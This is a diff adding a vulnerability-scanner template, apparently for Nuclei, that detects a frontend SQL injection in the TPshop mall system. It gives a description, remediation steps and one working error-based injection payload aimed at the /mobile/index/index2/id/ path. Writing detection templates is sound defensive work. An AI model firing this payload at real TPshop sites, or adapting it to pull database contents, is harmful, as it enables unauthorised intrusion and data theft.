@@ -1,0 +1,33 @@
+id: TpShop-Sqli
+info:
+  name: TPSHOP SQLi
+  author:
+  - l0ne1y
+  description: |-
+    TPshop open-source mall system frontend SQL injection
+    The frontend of the TPshop open-source mall system has an SQL injection vulnerability
+    In web applications, SQL statements are usually used to query and update database data, and such operations usually come with some conditions that are typically supplied by user input. Malicious users can therefore modify the relevant conditions to execute malicious SQL statements to obtain or update database data. If the database account has high privileges, they can even inject malicious SQL statements to call special database functions to read/write files on the server or execute operating system commands.
+  severity: high
+  remediation: |-
+    Official fix:
+    1. Upgrade the system to a non-vulnerable version, or download the security patch from the official website
+
+    Temporary fix:
+    1. Change I('get.id') to I('get.id/d')
+    2. Use prepared statements. When using PDO, do not directly concatenate variables into PDO statements. Use the parameterized query interface provided by the database for all query statements; parameterized statements use parameters instead of embedding user-supplied variables into SQL statements. Almost all database systems currently provide a parameterized SQL execution interface, which can very effectively prevent SQL injection attacks.
+    3. Escape or encode special characters that enter the database, or convert their encoding.
+requests:
+- matchers:
+  - type: word
+    words:
+    - '{{verify}}'
+  - type: status
+    status:
+    - 500
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/mobile/index/index2/id/1) and (select 1 from (select count(*),concat(0x7e,(select
+    {{verify}}),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)--'
+  method: GET
+variables:
+  verify: '{{md5(rand_text_alphanumeric(8,""))}}'
